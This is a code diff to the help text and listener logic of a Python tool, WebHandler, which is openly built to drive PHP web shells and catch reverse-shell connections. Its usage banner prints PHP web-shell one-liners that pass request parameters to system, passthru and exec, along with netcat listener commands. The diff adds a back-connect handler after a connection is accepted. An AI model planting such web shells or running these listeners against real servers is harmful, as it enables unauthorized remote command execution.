@@ -39,14 +39,18 @@ from core.libs.thirdparty.termcolor import cprint, colored
 
 if len(argv) <= 1:
     cprint("-- Hanlder for PHP system functions & alternative 'netcat listener' --\n", 'blue')
-    cprint("--   Which works for POST and GET requests:    --", 'blue')
+    
+    cprint("Example: python webhandler.py --url http://www.mywebsite.com/shell.php?cmd=", 'green')
+    cprint("--   Works for POST and GET requests   --", 'blue')
     cprint("1-   <?php system($_GET['parameter']); ?>", 'yellow')
-    cprint("2-   <?php exec($_POST['parameter']); ?>", 'yellow')
-    cprint("3-   <?php passthru($_REQUEST['parameter']); ?>\n", 'yellow')
-    cprint("--   Alternative 'netcat listener'    --", 'blue')
+    cprint("2-   <?php passthru($_REQUEST['parameter']); ?>", 'yellow')
+    cprint("3-   <?php echo exec($_POST['parameter']); ?>\n", 'yellow')
+    
+    cprint("Example: python webhandler.py --listen 1234", 'green')
+    cprint("--   Alternative 'netcat listener'   --", 'blue')
     cprint("1-   netcat -l -p 1234", 'yellow')
     cprint("2-   nc -lvvp 4321\n", 'yellow')
-    print "Run: " + colored("{0} -h".format(argv[0]), 'red') + " for help"
+    print "Run: " + colored("{0} -h".format(argv[0]), 'red') + " for help & more example commands"
     exit(1)
 
 else:
@@ -64,11 +68,11 @@ else:
 
     elif getargs.listen:
         if 'windows' in OS().lower():
-            errmsg = '[!] WebHandler doesn\'t support Windows OS yet, '
-            errmsg += 'still working on it.'
+            errmsg = '[!] WebHandler doesn\'t support Windows yet, still working on it.'
             exit(cprint(errmsg, 'red'))
         else:
             listen.wait_connection()                                # Call wait_connection to wait for a connection
+            commander.BackConnect()                                 # Call BackConnect method to handle input
 
     elif getargs.update:
         update()                                                    # Update the script
